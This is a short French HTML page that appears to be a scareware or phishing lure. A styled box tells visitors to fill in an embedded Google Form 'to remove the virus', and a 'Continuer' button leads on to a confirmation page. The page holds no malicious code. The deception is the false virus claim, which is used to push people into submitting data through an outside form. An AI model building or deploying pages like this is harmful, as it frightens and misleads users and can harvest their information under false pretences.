<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire de Suppression</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #007BFF, #0056b3);
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .form-box {
            background-color: #fff;
            color: #212529;
            border-radius: 15px;
            padding: 30px 40px;
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
            text-align: center;
            width: 90%;
            max-width: 700px;
            animation: fadeIn 1s ease-in-out;
        }

        .form-box h1 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #212529;
        }

        iframe {
            border: 1px solid #ddd;
            border-radius: 10px;
            width: 100%;
            height: 600px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .continue-button {
            margin-top: 20px;
            padding: 15px 30px;
            background-color: green;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s;
        }

        .continue-button:hover {
            background-color: darkgreen;
            transform: scale(1.05);
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: scale(0.9);
            }
            to {
                opacity: 1;
                transform: scale(1);
            }
        }
    </style>
</head>
<body>
    <div class="form-box">
        <h1>Pour supprimer le virus, remplissez ce formulaire :</h1>
        <iframe 
            src="https://docs.google.com/forms/d/e/1FAIpQLScB5_ZDqSUUevwRML-sK4WPUeyUqyx8jfBzGSDIkqDldE3Wiw/viewform?embedded=true" 
            frameborder="0">
            Chargementâ€¦
        </iframe>
        <button class="continue-button" onclick="window.location.href='confirmation.html'">Continuer</button>
    </div>
</body>
</html>
